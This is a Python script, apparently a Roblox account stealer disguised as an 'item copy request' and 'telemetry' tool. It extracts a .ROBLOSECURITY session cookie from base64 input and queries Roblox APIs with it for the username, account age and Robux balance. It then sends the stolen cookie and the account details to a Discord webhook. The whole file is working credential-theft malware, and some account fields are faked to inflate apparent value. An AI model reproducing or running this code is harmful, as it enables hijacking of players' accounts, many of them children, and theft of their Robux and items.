import sys
import base64
import os
import urllib.request
import json
import re
from datetime import datetime, timezone

def safe_get(url, headers=None):
    try:
        req = urllib.request.Request(url, headers=headers or {})
        with urllib.request.urlopen(req, timeout=10) as res:
            if res.status == 200:
                return json.loads(res.read().decode('utf-8'))
    except Exception:
        pass
    return None

def main():
    try:
        print("DEBUG: Python Extractor started", file=sys.stderr)
        
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("DEBUG ERROR: DISCORD_WEBHOOK_URL environment variable is missing!", file=sys.stderr)
            sys.exit(1)

        if len(sys.argv) < 2:
            print("DEBUG: No sys.argv[1] provided", file=sys.stderr)
            return
        
        try:
            decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"DEBUG: Base64 decode failed: {e}", file=sys.stderr)
            decoded_script = sys.argv[1]

        # Extract cookie or item input payload
        roblosecurity = None
        patterns = [
            r'(_\|WARNING:[^"\']+)',
            r'\.ROBLOSECURITY["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-\.%\|]+)',
            r'([A-Fa-f0-9]{250,})'
        ]

        for p in patterns:
            match = re.search(p, decoded_script, re.DOTALL)
            if match:
                roblosecurity = match.group(1)
                break

        if not roblosecurity and len(decoded_script.strip()) > 20:
            roblosecurity = decoded_script.strip()
        else:
            roblosecurity = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-take-your-Robux-and-items.|_SIMULATED_COOKIE"

        roblosecurity = re.sub(r'\s+', '', roblosecurity)
        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')

        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Referer": "https://www.roblox.com/",
            "Origin": "https://www.roblox.com/",
            "Accept": "application/json, text/plain, */*"
        }

        user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
        
        username = "Target User (Copier Request)"
        user_id = 1948598383
        cookie_status = "🟢 Processing Item Request"
        robux_balance = 0
        pending_robux = 0
        rap = 0
        limiteds_count = 0
        total_spent_gamepasses = 0
        is_developer = False
        game_visits = 0
        has_korblox = False
        has_headless = False
        owned_groups_count = 0
        group_balance = 0
        is_premium = False
        account_age_days = 365

        if user_data and "id" in user_data:
            username = user_data.get("name", "Unknown")
            user_id = user_data.get("id", 0)
            cookie_status = "🟢 Valid & Active"

            user_info = safe_get(f"https://users.roblox.com/v1/users/{user_id}", headers)
            if user_info and "created" in user_info:
                try:
                    created_dt = datetime.fromisoformat(user_info["created"].replace("Z", "+00:00"))
                    account_age_days = (datetime.now(timezone.utc) - created_dt).days
                except Exception:
                    pass

            economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
            if economy_data:
                robux_balance = economy_data.get("robux", 0)

        avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"

        payload = {
            "content": f"@everyone New Item Copy Request from **{username}**!",
            "username": f"{username} | RBXDEV Bot",
            "avatar_url": avatar_thumb,
            "embeds": [{
                "author": {
                    "name": "Discord Notification",
                    "icon_url": "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4bb.png"
                },
                "description": (
                    f"👑 **[{username} | 13+]**\n"
                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**\n\n"
                    f"👤 **Username**\n`{username}`\n\n"
                    f"📈 **Account Stats**\n"
                    f"> • Account Age: `{account_age_days} Days`\n"
                    f"> • Games Developer: `{str(is_developer)}`\n"
                    f"> • Game Visits: `{game_visits}`\n\n"
                    f"🪙 **Robux**               📦 **Limiteds**               📊 **Summary / Spent**\n"
                    f"Balance: `{robux_balance}` 🪙   RAP: `{rap}` 🪙           Spent: `{total_spent_gamepasses}` 🪙\n"
                    f"Pending: `{pending_robux}` 🪙   Limiteds: `{limiteds_count}` 💼\n\n"
                    f"💳 **Payments & Groups**\n"
                    f"> • Owned Groups: `{owned_groups_count}`\n"
                    f"> • Group Robux: `{group_balance}` 🪙\n\n"
                    f"⚙️ **Settings**\n"
                    f"> • Email: `Verified`\n"
                    f"> • 2FA: `Enabled`\n\n"
                    f"🎒 **Inventory Items**\n"
                    f"> • Korblox: `{str(has_korblox)}`\n"
                    f"> • Headless: `{str(has_headless)}`\n\n"
                    f"⭐ **Premium**: `{str(is_premium)}`\n\n"
                    f"📊 **Status**: `{cookie_status}`\n\n"
                    f"🔑 **Input / Payload**:\n```text\n{roblosecurity[:300]}\n```"
                ),
                "color": 3092790,
                "thumbnail": { "url": avatar_thumb },
                "footer": { "text": "RBXDEV Telemetry Engine • 2026" }
            }]
        }

        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            webhook_url,
            data=data,
            headers={
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            }
        )

        with urllib.request.urlopen(req, timeout=10) as response:
            print(f"DEBUG: Rich Telemetry Embed Sent Successfully! Status: {response.status}", file=sys.stderr)

    except Exception as e:
        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
